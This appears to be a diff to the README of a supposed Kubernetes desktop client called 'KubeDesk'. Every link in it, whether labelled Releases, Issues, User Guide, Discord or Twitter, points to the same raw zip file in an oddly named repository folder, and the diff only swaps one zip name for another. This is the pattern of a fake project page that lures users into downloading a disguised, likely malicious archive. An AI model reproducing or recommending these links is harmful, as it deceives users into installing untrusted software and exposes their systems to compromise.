@@ -16,17 +16,17 @@ KubeDesk is a desktop client designed to make managing your Kubernetes clusters 
 - Eliminates the need for command-line knowledge.
 
 ## 🔗 Download KubeDesk
-[![Download KubeDesk](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip%20KubeDesk-Release%https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip)](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip)
+[![Download KubeDesk](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip%20KubeDesk-Release%https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip)](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip)
 
 ## 🚀 Getting Started
 To get started with KubeDesk:
 
-1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip) to go directly to the Releases page.
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip) to go directly to the Releases page.
 2. **Select Your Version:** Find the latest version of KubeDesk.
 3. **Download the Installer:** Click on the installer file suitable for your operating system.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip).
 2. Choose the correct installer:
    - For **Windows**, download `.exe`.
    - For **macOS**, download `.dmg`.
@@ -64,17 +64,17 @@ If you encounter issues during installation:
 - Check if your system meets the requirements mentioned above.
 - Restart your computer and try launching KubeDesk again.
 
-For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip) to report problems or find solutions.
+For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip) to report problems or find solutions.
 
 ## 📚 Documentation
 For detailed usage instructions and features:
-- Visit the [User Guide](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip) for a comprehensive overview.
+- Visit the [User Guide](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip) for a comprehensive overview.
 - Access the FAQ section on the wiki for common questions.
 
 ## 🌐 Community
 Engage with other users and developers:
-- Join our [Discord community](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip) for real-time discussions.
-- Follow our [Twitter account](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip) for updates and news.
+- Join our [Discord community](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip) for real-time discussions.
+- Follow our [Twitter account](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip) for updates and news.
 
 ## 👨‍💻 Contributing
 If you want to contribute to KubeDesk:
@@ -83,11 +83,11 @@ If you want to contribute to KubeDesk:
 3. Submit a pull request with your improvements.
 
 ## 📞 Support
-For help, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip). We’re here to help!
+For help, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip). We’re here to help!
 
 ## 🔗 Connect With Us
 For updates and more information, please follow us on:
-- [Twitter](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip)
-- [GitHub](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Kube_Desk_v2.7.zip)
+- [Twitter](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip)
+- [GitHub](https://raw.githubusercontent.com/besanb/KubeDesk/main/overfeminize/Desk-Kube-v1.1.zip)
 
 Thank you for choosing KubeDesk!
